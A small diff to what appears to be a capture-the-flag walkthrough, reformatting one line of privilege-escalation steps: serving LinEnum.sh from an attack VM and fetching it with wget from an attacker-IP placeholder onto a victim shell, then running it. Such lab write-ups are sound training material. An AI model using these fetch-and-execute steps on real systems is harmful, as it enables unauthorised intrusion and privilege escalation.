@@ -112,7 +112,7 @@ Escalate privileges and submit the root.txt flag.
 * unzip personal.zip
 * cd personal/stuff
 * copy LinEnum.sh on your attack VM from https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-* sudo python3 -m http.server 8080 (on your attack VM)
+* `sudo python3 -m http.server 8080` (on your attack VM)
 * `wget http://<attacker vm ip>:8080/LinEnum.sh` on victim shell
 * `chmod +x LinEnum.sh` on victim shell
 * run command `./LinEnum.sh` on victim shell
